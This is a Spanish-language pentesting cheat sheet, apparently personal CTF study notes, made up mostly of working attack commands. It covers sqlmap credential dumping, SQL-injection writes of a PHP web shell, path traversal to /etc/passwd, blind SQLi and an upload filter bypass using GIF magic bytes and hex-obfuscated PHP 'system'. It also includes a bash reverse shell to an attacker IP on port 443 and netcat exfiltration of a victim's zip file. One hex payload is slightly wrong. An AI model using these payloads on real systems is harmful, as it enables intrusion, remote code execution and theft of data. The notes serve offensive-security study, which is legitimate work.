+            >sqlmap -u 'http://<IP>/dashboard.php?id=1' --cookie "PHPSESSID=abcdcookieabcd" --batch --dbms mysql -D darkhole_2 -T users --columns
+            
+     4- Para dumpear usuario y contraseñas:
+            >sqlmap -u 'http://<IP>/dashboard.php?id=1' --cookie "PHPSESSID=abcdcookieabcd" --batch --dbms mysql -D darkhole_2 -T users -C username,password --dump
+                      (Muestra los users y passwords, en caso de estar haseados, aplica automaticamente fuerza bruta)
+
+   
+    **SHELL**
+    -Podemos tratar de incluir una cadena dentro de una archivo dado:
+     (Teniendo capacidad de escritura)
+    
+     ' union select 1, "<?php system($_GET['cmd']); ?>",3,4,5,6 into outfile "/var/www/html/cmd.php"-- -
+     
+                 G: http:<IP>/dashboard.php?id=' union select 1, "<?php system($_GET['cmd']); ?>",3,4,5,6 into outfile "/var/www/html/cmd.php"-- - (ENTER)
+                 
+                   (En caso de haber incluido el texto podremos apuntar a el desde la URL)
+                   
+       (Con sqlmap se hace asi:)            
+            >sqlmap -u 'http://<IP>/dashboard.php?id=1' --cookie "PHPSESSID=abcdcookieabcd" --os-shell --batch     
+            
+            
+            
+--------------------------MANERA 2  -  DESDE PANEL DE LOGIN
+
+    1- Desde el panel de login, interceptaremos la peticion:
+            Username:test
+            Password: test   (Enviar)
+              
+              -Burpsuite:
+                POST / ...
+                ...
+                username=test&password=test    (Copio todo el contenido de la peticion, y crearé un archivo desde consola y pegaré el contenido:)
+                
+     2- Crearé un archivo con el contenido de la peticion:               
+                     >nano request
+                            POST / ...
+                             ...
+                            username=test&password=test
+                            
+     3- Lanzaré sqlmap indicando el archivo creado request:
+                    >sqlmap -r request --threads 10 --batch --dbs 
+                    
+                    >sqlmap -r request --threads 10 --batch -D chat --tables
+                    
+                    >sqlmap -r request --threads 10 --batch -D chat -T user --dump
+                                 
+                     
+    
+
+
+
+
+/////////
+-Probar ataque NoSQL
+
+/////////
+-Xpath inyection
+
+
+
+9. Type Jugling (ver si cambiando el texto podemos lograr burlar la comparativa)---------------------------------------------------------
+/////////
+-Type Jugling (ver si cambiando el texto podemos lograr burlar la comparativa:
+	-Interceptando la peticion de Login con Burpsuite:
+		Username: rmichaels
+		Password: test
+
+				BURPSUITE:  POST /...
+							...
+							user=rmichaels&password=test   ->Cambio por ->   user=rmichaels&password[]=test   -> Fordward->  
+////
+http://<IP>/admin/cms.php?pagename=home   -> Cambiar por: -> http://<IP>/home.php
+															 http://<IP>/home
+
+
+
+
+10. LOCAL FILE INCLUSION-----------------------------------------------------------------------------------------------------------------
+	
+11. Wrapers-----------------------------------------------------------------------------------------------------------------------------													(No existe)
+Usar wraper:						
+http://<IP>/admin/cms.php?pagename=php://filter/convert.base64-encode/resource=upload    
+							                       upload.php
+							          	       upload%00    (añadiendo null byte)
+
+
+
+12. Path traversal-----------------------------------------------------------------------------------------------------------------------------
+
+Intentar path traversal:
+http://<IP>/admin/cms.php?pagename=/etc/passwd
+http://<IP>/admin/cms.php?pagename=../../../../../etc/paswd
+http://<IP>/admin/cms.php?pagename=....//....//....//....//....//etc/paswd
+http://<IP>/admin/cms.php?pagename=....//....//....//....//....//etc/paswd%00
+
+http://<IP>/admin/cms.php?pagename=home'     (Le añadimos una comilla para ver si acontece un error en la BD)
+(SI arroja error, probablemente sea vulnerable a injeccion SQL):Probar:
+	http://<IP>/admin/cms.php?pagename=home' or 1=1-- -
+	http://<IP>/admin/cms.php?pagename=home' and 1=1-- -
+	http://<IP>/admin/cms.php?pagename=home' or '1'='1    (Booleana) ->cambia, entonces probamos:
+		http://<IP>/admin/cms.php?pagename=home' or '1'='2								   
+		http://<IP>/admin/cms.php?pagename=home' order by 10-- -   (Para comprobar cuantas columnas existen.. sino funciona podemos hacerlo con union select):
+														   9 
+														   8  ...
+			http://<IP>/admin/cms.php?pagename=home' union select 1-- -
+			http://<IP>/admin/cms.php?pagename=home' union select 1,2-- -
+			http://<IP>/admin/cms.php?pagename=home' union select 1,2,3-- -      ...  (pero sigue dandonos el error..)
+			
+(válida)->  http://<IP>/admin/cms.php?pagename=home' or '1'='1     (Muestra mensaje: Under cnstrucction; cambia del resto, por tanto funciona)
+		   -Para saber cuál es el nombre de la base actual en uso podría hacer:
+			http://<IP>/admin/cms.php?pagename=home' or substring(database(),1,1)='a  -> True; (Le digo si el primer caracter de la BD es igual a 'a' dame un true. 
+			    Me devuelve el mensaje Under construcction; por tanto es true, el primer caracter es una a.
+			    Si probaramos con otra letra devolveria el error.
+			    Por tanto ya se que el primer caracter es 'a', podria intuir 'admin', probaria los siguientes para averiguar el nombre de la base de datos:
+			        http://<IP>/admin/cms.php?pagename=home' or substring(database(),2,1)='d  -> True;
+			                                                                         3,1)='m  -> True;   ... asi para admin.
+			-Para tratar de dumpear los nombres de todas las bases de datos, tablas..etc, podriamos usar:
+			    con Burpsuite interceptamos la ultima peticion: y dentro estara la Cookie: PHPSESSID=3tubvuhchvv49beg3rhiv4pj23
+	                -Podriamos hacer un curl a la peticion, pero debemos indicarle el PHPSESSID:
+	                 > curl -s-X GET "http://<IP>/admin/cms.php" -H "Cookie: PHPSESSID=3tubvuhchvv49beg3rhiv4pj23"
+	                       (devuelve la peticion)
+	                -Nos crearemos un script:  (sqli.py)
+                       (Al ejecutar muestra 'admin')
+                    -Creamos otro para enumerar todas las bases de datos:   (sqly_BD.py)
+                       (Devuelve el nombre de todas las bases de datos)
+                       
+                    -Crearemos otro para enumerar todas las tablas de una base de datos:  (sqly_tables.py)
+                        (devuelve 'pages')
+                    -Ahora crearemos otro para enumerar las columnas de dicha tabla:   (sqly_columns.py)
+                       (Devuelve 'id,pagename,pagedata')
+                    -Ahora para ver lo que valen : pagename y pagedata , haremos:    (sqly_datafinal.py)
+                        (Devuelve: 'disavowlist,home,tutorials-incomplete,upload' vemos un nuevo directorio del nav, qu no aparece (tutorials-incomplete))
+                          -Lo probaremos en la URL:
+
+
+
+
+
+13. Captura de pantalla----------------------------------------------------------------------------------------------------------------------------
+///////
+-Para tomar una CAPTURA DE PANTALLA:
+   >sudo apt install flameshot
+   sleep 4; flameshot gui
+       (A los 4 segundos permite seleccionar y guardar una captura de lo que tengamos delante)
+ 
+ 
+ 
+ 
+14. SUBIDA DE ARCHIVOS:   (PHP INTERPRETA) + WAF-----------------------------------------------------------------------------------------------------------------------------  
+    
+/////////
+SUBIDA DE ARCHIVOS:   (PHP INTERPRETA)
+G: http://<Ip>/administrator/upload.php  (imaginemos que en esta ruta hay una pagina que permite subir un archivo)(Vemos que interpreta el php...por tanto el archivo
+que tratare de incluir será una reverse shell en php):
+
+-Al subir un archivo se pueden estar validando varias cosas..:
+    -Primero crearé un archivo php que me permita controlar el comando a insertar, y trataré de subirlo:
+        > nano cmd.php
+        -----------------------------
+            <?php
+                system($GET['cmd']);
+            ?>
+        -----------------------------    
+                ->SUBIR:  cmd.php
+                    (Devuelve error...) X 
+                    
+    -Puede que esté leyendo magic numbers:   (Añado  GIF8;)
+        -----------------------------
+            GIF8;
+            <?php
+                system($GET['cmd']);
+            ?>
+        -----------------------------    
+                ->SUBIR:  cmd.php
+                    (Devuelve error...) X 
+          
+          
+-Interceptaremos la subida con burpsuite para tratar de subir un archivo php
+        Burpsuite:  POST /administrator/upload.php
+                       ...
+                    Content-Type: image/jpg
+                       ...
+                    GIF8;
+                    <?php
+                    system($GET['cmd']);
+                    ?>
+                    
+                    ->FORDWARD ->  (Error)  X
+   ** WAF **
+    Error Waf detected malware... system php function detected  -> Nos indica que system no lo permite, 
+    -Existen maneras de camuflar el system:
+    
+            <?php                           <?php
+                system($GET['cmd']); --->       $c=$_GET['cmd'];
+            ?>                                  echo `$c`;
+                                            ?>  
+    
+        (En lugar de system, creo una variable c, y luego hago una lamada a c, que ejecuta su comando)
+       -Otra manera es convertir la palabra system a una cadena de texto hexadecimal:
+            
+            <?php                                           <?php
+                "system"("who"); ---> En hexadecimal: -->      #"system" in hex: 73 79 73 74 65 6d
+            ?>                                                 "\x73\x79\x73\x74\x65\x5d"("who");
+                                                            ?>
+                                               (Ambos funcionan)
+         -De esta manera puedo pasarle el comando que yo quiera ejecutar:
+           
+             <?php
+                "\x73\x79\x73\x74\x65\x5d"($_GET['cmd']);
+             ?>
+             
+        -Volveremos a subir con burpsuite, indicando en el campo 'filename=cmd.gif', nuestro cmd es .php, pero en burpsuite le indicaremos que es de tipo gif...:
+        
+            Burpsuite:  POST /administrator/upload.php
+                       ...
+                    ...filename= cmd.gif         <--
+                    Content-Type: image/jpg
+                       ...
+                    GIF8;
+                      <?php
+                        "\x73\x79\x73\x74\x65\x5d"($_GET['cmd']);    <--
+                      ?>
+                    
+                    ->FORDWARD ->  (ok, subido)
+                  
+              -Nos iremos a la URL, y desde el directorio que contenga las subidas, apuntaremos al archivo, y trataremos de ejeccutar el comando:
+                    G: http://<IP>/imfadministrator/uploads/miarchivo_cmd.gif
+                            (Vemos que se está interpretando el php, por que solo aparece GIF-8)
+                    G: http://<IP>/imfadministrator/uploads/miarchivo_cmd.gif?cmd=whoami
+                            www-data     (¡Podemos ejecutar comandos!)
+              -Nos mandaremos una bash al puerto 443, desde el que me pondré en escucha:
+                    G: http://<IP>/imfadministrator/uploads/miarchivo_cmd.gif?cmd=bash -c "bash -i >%26/dev/tcp/<Mi IP>/443 0>%261"
+                            
+                                       -Por otro lado estando en escucha.
+                                            >nc -nvlp 443
+                                                (Listenning....)
+                                                www-data:$> whoami
+                                                    www-data
+15. Tratamiento TTY-----------------------------------------------------------------------------------------------------------------------------
+  -TRATAMIENTO TTY                         -Ahora haremos TRATAMIENTO TTY:
+                                                           >script /dev/null -c bash
+                                                              (Ctrl+Z)
+                                                                  
+                                                                       >stty raw -echo; -fg
+                                                                                    reset xterm
+                                                   www-data:$>export TERM=xterm
+                                                             >export SHELL=bash                  
+                                                             >stty rows 44 columns 184      
+    
+    
+                                                            -Ver que servicios estan corriendo en la maquinas/puertos:
+                                                              >netstat -nat
+                                                                  tcp    0    0 127.0.0.1:3306    0.0.0.0      LISTEN 
+                                                                  tcp    0    0 0.0.0.1:7788      0.0.0.0      LISTEN     <--
+                                                                  ...
+                                                               
+                                                             
+                                                            -Intentar conectarnos a la maquina por el puerto 7788:
+                                                               >nc localhost 7788
+                                                                            Agent ID:     (conecta)
+
+                                                            -Ver si hay servicio corriendo por nombre:
+                                                               >ps -faux | grep nombre_proceso
+
+                                                            -Ver las capabilities:
+                                                               >getcap /usr/local/bin/agent  
+
+                                                            -Para analizar un binario. Se puede usar Ghidra:
+16. HERRAMIENTA: >>>>----GHIDRA---->----------------------------------------------------------------------------------------------------------------
+
+HERRAMIENTA:
+>>>>----GHIDRA----> Herramienta de ingenieria inversa de software desarrollada por la NSA.
+Download: https://github.com/NationalSecurityAgency/ghidra
+
+(Debemos descargar el comprimido  .zip)
+   
+   
+   
+   
+    
+17. Buscar info en una imagen------------------------------------------------------------------------------------------------------------------------                     
+///////////////                      
+-BUSCAR INFO EN UNA IMAGEN:
+    >ls
+      img.jpg
+-Ver metadatos de una imagen:
+    >exiftool img.jpg                 
+               
+-Listar las cadenas de caracteres imprimibles de la imagen:
+    >strings img.jpg
+
+-Ver información oculta en bits de la imagen:   
+    >steghide info img.jpg
+           (puede solicitar contraseña)
+         oculto.txt   (Existe un archivo oculto)
+   -Puedo extraerlo introduciendo la contraseña:
+        >steghide extract -sf img.jpg
+            Contraseña: (Introduzco contraseña) (Extrae el archivo)
+////////////////
+
+
+18. DIRECTORY LISTING-------------------------------------------------------------------------------------------------------------
+DIRECTORY LISTING:
+-En caso de poder tener acceso a directory listing, yo puedo traerme el contenido a mi pc local:
+   > wget -r http://<IP>/.git/
+        (Descarga en una carpeta todo el contenido del directory listing.)
+
+
+19. NETCAT   Y   ZIP-------------------------------------------------------------------------------------------------------------
+////////////////////////////////////////
+NETCAT   Y   ZIP  :
+
+-COnectar y transferir archivos con netcat:
+
+1ºConsola Victima:                     2ºConsola atacante en escucha:             
+> ls 
+    secreto.zip                    
+> nc 10.10.14.4 < secreto.zip          > sudo nc -nvlp 443 > comprimido.zip 
+        (MI IP) (manda el archivo)            (recibo el archivo y renombro)
+                                       > ls
+                                           comprimido.zip
+
+					  -Para ver que hay dentro:
+						> 7z l comprimido.zip
+						      Date      Time    Attr         Size   Compressed  Name
+							------------------- ----- ------------ ------------  ------------------------
+							2023-05-24 05:51:31 .....    253395188     87387677  KeePassDumpFull.dmp
+							------------------- ----- ------------ ------------  ------------------------
+
+				          -Para descomprimir:
+						> 7z x comprimido.zip
+   							(Descomprime:)
+ 
+
+////////////////////////////////////////
